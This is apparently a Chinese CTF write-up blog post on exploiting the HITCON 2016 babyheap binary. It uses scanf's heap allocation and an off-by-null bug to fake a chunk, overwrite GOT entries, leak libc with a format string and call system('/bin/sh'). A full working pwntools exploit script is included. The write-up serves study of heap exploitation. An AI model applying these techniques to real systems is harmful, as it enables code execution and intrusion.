---
clayout: post
title:  "scanf malloc"
date:   2020-2-20
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

#scanf malloc

glibc2.23后，scanf的缓冲区在堆中，利用scanf可以触发malloc申请比较大的堆块

## Hitcon2016-babyheap

```c
struct note{
    int len;
    char name[8];
    char *content;
};
```

add 新建note

edit 根据content指针找content，只能edit一次

```c
int edit()
{
  if ( !ptr || dword_6020A4 )
  {
    puts("bye bye");
    _exit(0);
  }
  printf("Content:");
  fuck_read(*(ptr + 2), *ptr);
  ++dword_6020A4;
  return puts("Done!");
}
```

delete free note和content

只能有一个note

```c
char *__fastcall fuck_read(char *a1, int a2)
{
  char *result; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = read(0, a1, a2);
  if ( v3 <= 0 )
  {
    puts("Error");
    _exit(-1);
  }
  result = &a1[v3];
  *result = 0;
  return result;
}
```

在输入name和content时都是调用这个函数，存在off by null

在输入name时off by null可以覆盖content指针

```c
      else if ( v3 == 4 )
      {
        printf("Really? (Y/n)", a2);
        a2 = &v4;
        __isoc99_scanf("%2s", &v4);
        if ( v4 != aN[0] )
          _exit(0);
      }
```

调用scanf

### exp

1. scanf，得到一个大chunk，在接下来覆盖后的content指针指向的位置伪造堆块

2. add，name中off by null覆盖content指针，content中伪造size

   ```c
   pwndbg> x/256gx 0x603000
   0x603000:       0x0000000000000000      0x0000000000001011
   0x603010:       0x000000000000006e      0x0000000000000000
   ......
   pwndbg> x/64gx 0x603fe0
   0x603fe0:       0x0000000000000000      0x0000000000000000
   0x603ff0:       0x0000000000000000      0x0000000000000081//fake chunk
   0x604000:       0x0000000000000000      0x0000000000000000
   0x604010:       0x0000000000000000      0x0000000000000021
   0x604020:       0x0000000000000080      0x6161616161616161//off by null
   0x604030:       0x0000000000604000      0x0000000000000091
   0x604040:       0x0000000000000000      0x0000000000000000
   0x604050:       0x0000000000000000      0x0000000000000000
   0x604060:       0x0000000000000000      0x0000000000000000
   0x604070:       0x0000000000000000      0x0000000000000041//size
   0x604080:       0x0000000000000000      0x0000000000000000
   0x604090:       0x0000000000000000      0x0000000000000000
   0x6040a0:       0x0000000000000000      0x0000000000000000
   0x6040b0:       0x0000000000000000      0x0000000000000000
   0x6040c0:       0x0000000000000000      0x0000000000020f41
   ```

3. free，note和fake chunk被free

   ```c
   fastbins
   0x20: 0x604010 ◂— 0x0
   0x30: 0x0
   0x40: 0x0
   0x50: 0x0
   0x60: 0x0
   0x70: 0x0
   0x80: 0x603ff0 ◂— 0x0
   ```

4. add，content申请到fake chunk的位置，输入content可以覆盖note中的content指针，覆盖为exit_got

5. edit，把exit改成ret，在edit中执行exit(0);直接返回，可以多次edit， 把atoi改成printf，格式化字符串泄露libc。中间遇到其他函数，需要用的就改成原来的plt，不需要的直接p64(0)

6. 此时调用atoi就是调用printf，返回值为输出的字节数，格式化字符串泄露libc

7. 输入三字节，返回值3，进edit，把atoi改成system

8. 输入/bin/sh

```python
from pwn import *
#r = remote('node3.buuoj.cn',27921)
r = process('./babyheap_hitcon_2016')
elf = ELF('./babyheap_hitcon_2016')
libc = ELF('/libc-2.23.so')

def add(size,content,name):
	r.sendlineafter('Your choice:','1')
	r.sendlineafter('Size :',str(size))
	r.sendafter('Content:',content)
	r.sendafter('Name:',name)

def free():
	r.sendlineafter('Your choice:','2')

def edit(content):
	r.sendlineafter('Your choice:','3')
	r.sendafter('Content:',content)


r.sendafter('Your choice:','4')
r.recvuntil('(Y/n)')
chunk = 'n'+'\x00'*(0x1000-1-0x20)+p64(0)+p64(0x81)+p64(0)*2
r.sendline(chunk)
add(0x80,p64(0)*7+p64(0x21),'a'*8)
free()
add(0x70,p64(0)*3+p64(0x41)+p64(0x60)*2+p64(elf.got['_exit']),'aaaa')



payload = p64(0x400c9d)
payload += p64(elf.plt['read']+6)
payload += p64(elf.plt['puts']+6)
payload += p64(0)
payload += p64(elf.plt['printf']+6)
payload += p64(0) 
payload += p64(elf.plt['read']+6)
payload += p64(0)*4
payload += p64(elf.plt['printf']+6)
edit(payload)


r.recvuntil('Your choice:')
r.send('%7$p')
r.recvuntil('0x')
leak = int(r.recvuntil('Invalid',drop=True),16)
log.success(hex(leak))
libc_base = leak-362-libc.sym['_IO_puts']
log.success(hex(libc_base))
system=libc_base+libc.sym['system']
log.success(hex(system))
r.send('333')

payload = p64(0x400c9d)
payload += p64(elf.plt['read']+6)
payload += p64(elf.plt['puts']+6)
payload += p64(0)
payload += p64(elf.plt['printf']+6)
payload += p64(0) 
payload += p64(elf.plt['read']+6)
payload += p64(0)*4
payload += p64(system)
r.send(payload)
r.send('/bin/sh\x00')
r.interactive()
```

